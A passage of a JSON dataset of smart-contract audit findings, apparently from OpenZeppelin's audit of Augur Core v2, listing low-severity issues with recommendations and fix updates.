[249](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/Orders.sol#L249) and [250](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/Orders.sol#L250) in `Orders.sol`.\n\n\nWhile this issue does not pose a security risk, as no exploitable overflows or underflows were detected in the current implementation, this may not hold true in future changes to the code base if unit testing is not effectively covering all cases.\n\n\nGiven that arithmetic operations on integers may overflow / underflow silently, causing bugs, consider using the existing `SafeMathUint256` and `SafeMathInt256` libraries for all arithmetic operations. Unit tests to ensure correct behavior are of utmost importance in cases where safe arithmetic operations are not used in favor of gas efficiency.\n\n\n***Update****: fixed in* [*`b138335`*](https://github.com/AugurProject/augur/commit/b138335a73206a10d2d371da8849a1597dd2e552) *for all of instances of the issue that we pointed out as examples.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11537",
      "title": "[L16] Multiple getters for the same state variable",
      "impact": "LOW",
      "content": "Several contracts in the Augur code base contain multiple public getter functions for the same state variable. For example:\n\n\n* In the [`ERC777BaseToken`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777BaseToken.sol) [contract](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777BaseToken.sol), there are multiple getter functions that return the token’s total supply. Namely,[`supply`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777BaseToken.sol#L16) (automatically generated by Solidity) and[totalSupply](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777BaseToken.sol#L31).\n* In the[`Augur`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol) [contract](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol), there are multiple getter functions that get the contract registered with a given key. Namely,[`registry`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L78) (automatically generated by Solidity) and[`lookup`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L103).\n\n\nTo favor encapsulation and explicitness, ensure that there is at most one publicly exposed getter for each contract state variable.\n\n\n***Update****: fixed in* [*`66745b6`*](https://github.com/AugurProject/augur/pull/2603/commits/66745b6af1a503a23a73c21bcc32186573d3d8ab) *by restricting the visibility of* *`supply`* *and* *`registry`**.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11536",
      "title": "[L15] Multiple unused return values",
      "impact": "LOW",
      "content": "In multiple locations in the Augur code base, there are private and internal functions that return boolean values indicating the function’s success. However, the functions often either revert or return true and their return values are not checked. Many public functions in the Augur code base also follow this pattern but the Augur team clarified that the return values of the public functions are intended for off-chain systems. Consider removing any unnecessary return values to avoid confusion about their intended purpose.\n\n\n***Update****: Fixed in* [*`2921365`*](https://github.com/AugurProject/augur/pull/2577/commits/292136502dba869a484a6b70bd1c42d101e4bc32) *by removing several unused return values.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11535",
      "title": "[L14] Inconsistent use of afterInitialized modifier in contracts",
      "impact": "LOW",
      "content": "Several contracts in Augur’s code base are intended to be deployed behind the [EIP 1167](https://eips.ethereum.org/EIPS/eip-1167) minimal proxy contract. Therefore, to be able to replace the `constructor` function, they all inherit functionality from the [`Initializable`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/Initializable.sol) contract. It provides two modifiers [`beforeInitialized`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/Initializable.sol#L13) and [`afterInitialized`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/Initializable.sol#L8), which are used to allow / deny access to a function based on the [`initialized`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/Initializable.sol#L6) boolean flag, which can be toggled to `true` (and never be set back to `false`) by calling the internal [`endInitialization`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/Initializable.sol#L18) function.\n\n\nAn inconsistent use of the `afterInitialized` modifier was found throughout Augur’s contracts. Where in many contracts `afterInitialized` seems to be correctly used to label every function that can only be called *after* initialization (*e.g.* in [`DisputeWindow`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/DisputeWindow.sol)), in other contracts (*e.g.* [`Market`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol)) the `afterInitialized` modifier is never used.\n\n\nConsider making the necessary changes in the contracts to consistently use the `afterInitialized` modifier, adding related unit tests that prevent developers from reintroducing this kind of issues. Thorough testing is in order should the development team decide to remove the `afterInitialized` modifier from all functions in contracts that are deployed through factories (which call the implementation’s `initialize` function), so as to ensure behavior is not affected and security not compromised in any sense.\n\n\n***Update****: fixed in* [*`aff5118`*](https://github.com/AugurProject/augur/commit/aff51185371b552b186a2a1a47767fb7cc124b87) *by removing all* *`afterInitialized`* *modifiers.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11534",
      "title": "[L13] Outdated ReentrancyGuard contract in use",
      "impact": "LOW",
      "content": "The [`ReentrancyGuard`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/ReentrancyGuard.sol) [contract](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/ReentrancyGuard.sol) currently in use is out of date. While its [`nonReentrant`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/ReentrancyGuard.sol#L19) [modifier](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/ReentrancyGuard.sol#L19) works as expected, consider updating the contract to the [latest version](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v2.3.0/contracts/utils/ReentrancyGuard.sol) in order to benefit from an optimized gas usage for small transactions. Refer to [OpenZeppelin’s issue #1056](https://github.com/OpenZeppelin/openzeppelin-solidity/issues/1056) for more details about such gas savings.\n\n\n***Update****: the Augur team decided not to implement our recommendation because the latest version of the* *`ReentrancyGuard`* *contract has an additional local variable which causes stack depth issues in some of their contracts.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11533",
      "title": "[L12] Unnecessary code repetition in CompleteSets contract",
      "impact": "LOW",
      "content": "The `CompleteSets` contract includes the functions [`publicSellCompleteSets`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/CompleteSets.sol#L69) and [`publicSellCompleteSetsWithCash`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/CompleteSets.sol#L76), which implement the exact same logic, both calling the [`sellCompleteSets`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/CompleteSets.sol#L83) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/CompleteSets.sol#L83). Similarly, the functions [`publicBuyCompleteSets`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/CompleteSets.sol#L35) and [`publicBuyCompleteSetsWithCash`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/CompleteSets.sol#L42) also behave the same, in this case calling the [`buyCompleteSets`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/CompleteSets.sol#L49) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/CompleteSets.sol#L49). Therefore, so as to favor simplicity, avoid confusions and reduce the code’s attack surface, consider removing one in each pair functions.\n\n\n***Update****: fixed in* [*`ebed2db`*](https://github.com/AugurProject/augur/commit/edeb2d90bf5b3f8b8906a4190b924dd25560c980) *by removing the* *`publicSellCompleteSetsWithCash`* *and* *`publicBuyCompleteSetsWithCash`* *functions.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11532",
      "title": "[L11] Unnecessary code repetition in Auction contract",
      "impact": "LOW",
      "content": "The `Auction` contract implements the functions [`getAuctionStartTime`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Auction.sol#L231) and [`getAuctionEndTime`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Auction.sol#L239), which implement the exact same logic except for [line 244](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Auction.sol#L244). Therefore, to favor simplicity and modularization, consider factoring out the repeated logic into a private function.\n\n\n***Update****: this issue is no longer valid as the* *`Auction`* *contract has been removed in* [*`f641c42`*](https://github.com/AugurProject/augur/commit/f641c42c47ca22d73e1e4184f6a5bb6e387e0630)*.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11531",
      "title": "[L10] Current Market owner may not receive no-show bond after initial report",
      "impact": "LOW",
      "content": "All market creators stake a no-show bond (paid in REP tokens) upon creating a market, which is to be automatically returned if the designated reporter reports a tentative outcome within the first 24 hours after the [market’s end time](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L46). When a `Market` is [initialized](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L63), the `owner` and `repBondOwner` state variables (the first one inherited from the [`Ownable`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/Ownable.sol) [contract](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/Ownable.sol)) are set to the market creator’s address (see [lines 78 and 79](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L78-L79)).\n\n\nIn a scenario where the ownership of a market has been transferred by calling the [`transferOwnership`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/Ownable.sol#L39) function and the designated reporter effectively shows up, the no-show bond is going to be still [transferred back to the original owner of the market](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L151), tracked in the `repBondOwner` state variable, and not to the current owner of the market. This behavior is inconsistent with what occurs in the [`InitialReporter`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/InitialReporter.sol) [contract](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/InitialReporter.sol), where the stake received after the initial report is [awarded to the current owner](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/InitialReporter.sol#L32) of the contract, and not to the original (*i.e.* the [actual reporter](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/InitialReporter.sol#L46-L47)).\n\n\nShould this be the system’s expected behavior, consider explicitly documenting such sensitive scenarios to raise end-user awareness. Adding related unit tests to increase coverage is advisable too.\n\n\n***Update****: fixed in* [*`142ed41`*](https://github.com/AugurProject/augur/commit/142ed4113a9773e9ebc9adc525f65c0800ed9446) *by adding a new* *`transferRepBondOwnership`* *function that must be called manually by the address in* *`repBondOwner`* *to transfer the ownership of the REP bond. However, the added function does not emit an event to notify off-chain clients of such sensitive change.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11530",
      "title": "[L09] System relies on off-chain clients calling unrestricted functions to stay up-to-date",
      "impact": "LOW",
      "content": "The Augur system relies on off-chain clients to call unrestricted functions in order to update and sync system parameters. In particular, public functions whose purpose is to update state, like [`updateTotalTheoreticalSupply`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L153) and [`updateForkValues`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L79) may be dangerous if called at an unexpected time. If the contract relies on a certain state during various stages of execution, having these functions available to be called by anyone may result in an undesired state change that may render the system inconsistent or vulnerable to an attack. Consequences of this issue can be seen in **“[C08] Fork reputation goal threshold can be decreased during fork”** or **“[L08] Getter for REP total theoretical supply may be inaccurate”**.\n\n\nConsider removing any state variables used to store dynamically calculated values such as `totalTheoreticalSupply` in the [`updateTotalTheoreticalSupply`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L153) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L153) and `forkReputationGoal` and `disputeThresholdForFork` in the [`updateForkValues`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L79) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L79). Instead, access these values through getter functions that recalculate the values as needed. This will guarantee they are up to date and accurate and remove any dependencies on off-chain systems.\n\n\n***Update****:* *fixed in* [*`48744d6`*](https://github.com/AugurProject/augur/commit/48744d6948c017dff747cf58e9efba2b6681b43e) *by removing the* *`totalTheoreticalSupply`* *state variable from the* *`ReputationToken`* *contract and modifying the* *`getTotalTheoreticalSupply`* *to recalculate and return the updated value of the total theoretical supply of REP tokens every time it is called.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11529",
      "title": "[L08] Getter for REP total theoretical supply may be inaccurate",
      "impact": "LOW",
      "content": "The `ReputationToken` contract implements the [`getTotalTheoreticalSupply`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L164) [public getter function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L164) to retrieve the value of the token’s [totalTheoreticalSuppy](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L24). While the `totalTheoreticalSuppy` is a [fixed value in the genesis universe](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L154-L155), it is [variable in a child universe whose parent universe fork is already finished](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L156-L157). However, for the `totalTheoreticalSupply` to change, the [`updateTotalTheoreticalSupply`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L153) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L153) must be manually called. Therefore, if the total supply of REP tokens has changed over a period of time during which the `updateTotalTheoreticalSupply` function was never called, the value returned by the `getTotalTheoreticalSupply` function will be outdated and potentially inaccurate.\n\n\nConsider implementing a more general approach to always keep in sync the `totalTheoreticalSupply` with the total supply of REP tokens in a child universe whose parent’s fork has already finished, as described in the reported **“[L09] System relies on off-chain clients calling unrestricted functions to stay up-to-date”** issue. For this case in particular, the `updateTotalTheoreticalSupply` function could be called before returning the `totalTheoreticalSupply` inside the `getTotalTheoreticalSupply` function.\n\n\n***Update****: fixed in* [*`48744d6`*](https://github.com/AugurProject/augur/commit/48744d6948c017dff747cf58e9efba2b6681b43e) *. The* *`getTotalTheoreticalSupply`* *function now calculates and returns the updated value of the total theoretical supply of REP tokens.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11528",
      "title": "[L07] REP token allows migration of legacy tokens after universe fork",
      "impact": "LOW",
      "content": "The `ReputationToken` contract implements the [`migrateFromLegacyReputationToken`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L183) function that allows users to migrate [legacy reputation tokens](https://docs.augur.net/#legacy-rep) in. However, there is no validation in place to prevent this migration from occurring in a REP token whose universe has forked and that fork has already finished.\n\n\nTo prevent unexpected locking and loss of tokens, consider implementing the necessary validations in the `migrateFromLegacyReputationToken` function to ensure no legacy tokens can be migrated to a REP token of a locked universe whose fork period has finished.\n\n\n***Update****: this has been identified as a non-issue by the Augur team, since even after a fork users should be able to migrate to the Genesis universe. Yet, our report led the Augur team to uncover a serious vulnerability which we included in this report, for the sake of completeness and transparency, in the new* ***“[H06] Legacy REP tokens can be migrated to child universes”*** *issue.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11527",
      "title": "[L06] LegacyReputationToken’s decimals public getter does not return uint8",
      "impact": "LOW",
      "content": "The [ERC20](https://eips.ethereum.org/EIPS/eip-20#decimals) specification specifies an optional getter for the token’s `decimals`, which must return a `uint8` type. While the [`LegacyReputationToken`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/LegacyReputationToken.sol#L12) [does implement this getter](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/LegacyReputationToken.sol#L12), it returns a `uint256` instead. Consider changing it to `uint8` to be fully ERC20 compliant. If `uint256` was used intentionally to match the currently deployed REP token implementation, consider thoroughly documenting that reasoning.\n\n\n***Update****: fixed in* [*`43a8d57`*](https://github.com/AugurProject/augur/commit/43a8d5736cb68c86f187c47b210e81490391cffa) *. Now the* *`decimals`* *public getter returns a* *`uint8`* *type.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11526",
      "title": "[L05] Redundant Mint and Burn events in VariableSupplyToken contract",
      "impact": "LOW",
      "content": "In the `VariableSupplyToken` contract, consider reusing the [`Burned`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777Token.sol#L29-L30) [and](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777Token.sol#L29-L30) [`Minted`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777Token.sol#L29-L30) [events](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/ERC777Token.sol#L29-L30) inherited from the `ERC777Token` contract, thus removing the defined [`Burn`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/VariableSupplyToken.sol#L11) and [`Mint`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/VariableSupplyToken.sol#L10) events.\n\n\n***Update****: fixed in* [*`484e3ac`*](https://github.com/AugurProject/augur/commit/484e3ac8c3ae077797941d763ac2fc80dabf4161) *. The* *`Burn`* *and* *`Mint`* *events in the* *`VariableSupplyToken`* *have been removed and the* *`burn`* *and* *`mint`* *functions now call the inherited* *`_mint`* *and* *`_burn`* *functions.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11525",
      "title": "[L04] Externally-owned accounts can be registered as contracts in the Augur contract",
      "impact": "LOW",
      "content": "The [`registerContract`>](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L90) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L90) in the `Augur` contract is a privileged function (only [called by the](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L91) [`uploader`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L91) [`address`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L91)) in charge of registering contract addresses in the [`registry`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L93) [`mapping`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L93), by associating the address with a given `key`. However, while the function is only intended to register contract addresses, there is currently no validation on whether the address provided is either a contract or an externally-owned account.\n\n\nWhile this issue does not pose a security risk, consider using the [`exists`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/ContractExists.sol#L6) [function of the](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/ContractExists.sol#L6) [`ContractExists`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/ContractExists.sol#L6) [utility library](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/ContractExists.sol#L6) to ensure the address being registered is indeed a contract.\n\n\n***Update****: fixed in* [*`eb10e94`*](https://github.com/AugurProject/augur/commit/eb10e94592d1c9b58fe61c9716fc9cfa61d2069c) *by using the* *`exists`* *function to validate the address being registered is indeed a contract.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11524",
      "title": "[L03] The Cash contract should not be an ERC777 token",
      "impact": "LOW",
      "content": "The [`Cash`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Cash.sol) [contract](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Cash.sol) inherits from the [`VariableSupplyToken`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/VariableSupplyToken.sol) [contract](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/VariableSupplyToken.sol) which is an [ERC777](https://eips.ethereum.org/EIPS/eip-777) token (although with several major deviations, as reported in **“[H01] Implementation of EIP 777 does not fully match the specification”**). Augur’s contracts are built to be able to use any ERC20 token (such as DAI) as the “Cash token”, which is used for trading as well as other purposes. Should the Cash token be implemented as an ERC777 token in production, it would potentially render other Augur contracts vulnerable to serious unexpected exploits such as reentrancy and denial of service attacks. Therefore, consider removing all ERC777 functionality from the `Cash` contract to avoid any unexpected behaviors, clearly documenting that the Cash token should not implement ERC777-related features, but only ERC20.\n\n\n***Update****: fixed in* [*`c0ad321`*](https://github.com/AugurProject/augur/commit/c0ad321e7cd514a72ed3f086be2f1bb06c23afa3) *by turning the* *`Cash`* *contract into an ERC20.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11523",
      "title": "[L02] Use of magic constants",
      "impact": "LOW",
